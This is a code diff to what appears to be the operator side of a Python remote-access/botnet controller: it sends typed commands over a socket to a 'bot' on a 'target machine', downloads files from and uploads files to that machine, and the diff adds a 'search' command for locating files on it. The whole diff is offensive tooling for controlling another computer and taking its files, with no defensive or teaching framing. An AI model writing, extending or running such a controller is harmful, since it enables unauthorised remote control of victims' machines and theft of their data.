@@ -48,9 +48,10 @@ def command_input(os_type):
     command = ""
     file_name = ""
     file_destination = ""
+    starting_directory = ""
     # While loop to make sure the user enters a command
     while command == "":
-        command = input(os_type + " > ")
+        command = input(os_type + "> ")
         # Check to see if the user entered download
         if command.lower() == "download":
             # Ask the user for a file name
@@ -60,9 +61,13 @@ def command_input(os_type):
             while file_name == "":
                 file_name = input("Enter the file's absolute path> ")
                 file_destination = input("Enter the destination path> ")
+        elif command.lower() == "search":
+            while file_name == "":
+                file_name = input("Enter the file name> ")
+                starting_directory = input("Enter the starting directory> ")
             # file_name = input_validator("Enter the file's absolute path> ")
     # Return the command and file name
-    return command, file_name, file_destination
+    return command, file_name, file_destination, starting_directory
 
 def download_file(socket, file_name, command="download"):
     """This function downloads a file from the target machine
@@ -97,10 +102,13 @@ def upload_file(socket, file_name, file_destination, command="upload"):
     # Send the command to the bot
     socket.send(command.encode())
     # Read the file into memory
-    with open(file_name, 'rb') as f:
-        file_data = f.read()
-        file_data = base64_encode(file_data)
-        socket.sendall(file_data)
+    try:
+        with open(file_name, 'rb') as f:
+            file_data = f.read()
+            file_data = base64_encode(file_data)
+            socket.sendall(file_data)
+    except:
+        print("File not found")
     # Encode the file data
     # TODO: Add error handling for file not found
 
@@ -155,18 +163,24 @@ def main():
         os_family = receive_data(client)
         os_family = base64_decode(os_family)
         os_family = os_family.decode()
-        running_directory = receive_data(client)
-        running_directory = base64_decode(running_directory)
-        running_directory = running_directory.decode()
+        # running_directory = receive_data(client)
+        # running_directory = base64_decode(running_directory)
+        # running_directory = running_directory.decode()
         user_continue = True
         while user_continue:
             # Get the command from the user
-            command, file_name, file_destination = command_input(os_family)
+            command, file_name, file_destination, starting_directory = command_input(os_family)
             # Check to see if the user entered download menu
             if command.lower() == "download":
                 download_file(client, file_name)
             elif command.lower() == "upload":
                 upload_file(client, file_name, file_destination)
+            elif command.lower() == "search":
+                command = command + " " + file_name + " " + starting_directory
+                client.send(command.encode())
+                full_data = receive_data(client)
+                decoded_data = base64_decode(full_data)
+                print(decoded_data.decode())
             # Check to see if the user entered quit
             else:
                 client.send(command.encode())
